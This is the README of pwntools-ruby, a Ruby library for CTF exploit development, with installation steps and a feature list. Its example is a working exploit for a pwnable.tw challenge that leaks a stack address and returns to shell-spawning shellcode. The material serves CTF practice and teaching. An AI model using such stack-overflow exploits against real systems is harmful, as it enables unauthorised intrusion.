[![GitHub stars](https://img.shields.io/github/stars/peter50216/pwntools-ruby.svg)](https://github.com/peter50216/pwntools-ruby/stargazers)
[![GitHub issues](https://img.shields.io/github/issues/peter50216/pwntools-ruby.svg)](https://github.com/peter50216/pwntools-ruby/issues)
[![Build Status](https://github.com/peter50216/pwntools-ruby/workflows/build/badge.svg)](https://github.com/peter50216/pwntools-ruby/actions)
[![Test Coverage](https://img.shields.io/codeclimate/coverage/peter50216/pwntools-ruby.svg)](https://codeclimate.com/github/peter50216/pwntools-ruby/coverage)
[![Code Climate](https://img.shields.io/codeclimate/maintainability/peter50216/pwntools-ruby.svg)](https://codeclimate.com/github/peter50216/pwntools-ruby)
[![Inline docs](https://inch-ci.org/github/peter50216/pwntools-ruby.svg)](https://inch-ci.org/github/peter50216/pwntools-ruby)
[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](http://choosealicense.com/licenses/mit/)
[![Dependabot Status](https://api.dependabot.com/badges/status?host=github&repo=peter50216/pwntools-ruby)](https://dependabot.com)
[![Rawsec's CyberSecurity Inventory](https://inventory.raw.pm/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.raw.pm/)
<!-- [![Dependency Status](https://img.shields.io/gemnasium/peter50216/pwntools-ruby.svg)](https://gemnasium.com/peter50216/pwntools-ruby) -->

# pwntools-ruby

Always sad when playing CTF that there's nothing equivalent to pwntools in Python.
While pwntools is awesome, I always love Ruby far more than Python...
So this is an attempt to create such library.

Would try to have consistent naming with original pwntools, and do things in Ruby style.

# Example Usage

Here's an exploitation for `start` which is a challenge on [pwnable.tw](https://pwnable.tw).

```ruby
# encoding: ASCII-8BIT
# The encoding line is important most time, or you'll get "\u0000" when using "\x00" in code,
# which is NOT what we want when doing pwn...

require 'pwn'

context.arch = 'i386'
context.log_level = :debug
z = Sock.new 'chall.pwnable.tw', 10000

z.recvuntil "Let's start the CTF:"
z.send p32(0x8048087).rjust(0x18, 'A')
stk = u32(z.recvuntil "\xff")
log.info "stack address: #{stk.hex}" # Log stack address

# Return to shellcode
addr = stk + 0x14
payload = addr.p32.rjust(0x18, 'A') + asm(shellcraft.sh)
z.write payload

# Switch to interactive mode
z.interact
```

More features and details can be found in the
[documentation](http://www.rubydoc.info/github/peter50216/pwntools-ruby/master/frames).

# Installation

### Install the latest release:
```sh
gem install pwntools
```

### Install from master branch:
```sh
git clone https://github.com/peter50216/pwntools-ruby
cd pwntools-ruby
bundle install && bundle exec rake install
```

### optional

Some of the features (assembling/disassembling) require non-Ruby dependencies. Checkout the
installation guide for
[keystone-engine](https://github.com/keystone-engine/keystone/tree/master/docs) and
[capstone-engine](http://www.capstone-engine.org/documentation.html).

Or you are able to get running quickly with

```sh
# Install Capstone
sudo apt-get install libcapstone3

# Compile and install Keystone from source
sudo apt-get install cmake
git clone https://github.com/keystone-engine/keystone.git /tmp/keystone
cd /tmp/keystone
mkdir build
cd build
../make-share.sh
sudo make install
```

# Supported Features

## Architectures

- [x] i386
- [x] amd64
- [ ] arm
- [ ] thumb

## Modules

- [x] context
- [x] asm
- [x] disasm
- [x] shellcraft
- [x] elf
- [x] dynelf
- [x] logger
- [x] tube
  - [x] sock
  - [x] process
  - [x] serialtube
- [ ] fmtstr
- [x] util
  - [x] pack
  - [x] cyclic
  - [x] fiddling

# Development
```sh
git clone https://github.com/peter50216/pwntools-ruby
cd pwntools-ruby
bundle
bundle exec rake
```

# Note to irb users
irb defines `main.context`.

For the ease of exploit development in irb, that method would be removed if you use `require 'pwn'`.

You can still get the `IRB::Context` by `irb_context`.
